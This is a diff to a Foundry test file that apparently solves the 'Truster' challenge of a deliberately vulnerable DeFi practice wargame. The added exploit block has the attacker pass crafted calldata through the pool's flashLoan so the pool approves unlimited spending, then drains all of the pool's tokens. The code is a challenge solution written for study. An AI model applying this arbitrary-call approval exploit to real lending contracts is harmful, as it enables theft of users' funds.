@@ -35,9 +35,15 @@ contract Truster is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    // forge test --match-contract Truster
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        // data to pass in flashloan paramter to approve attacker to spend all tokens in victims address.
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)",attacker,type(uint256).max);
+        trusterLenderPool.flashLoan(0, msg.sender, address(dvt), data);
+        // stealing all the tokens
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         /** EXPLOIT END **/
         validation();
     }
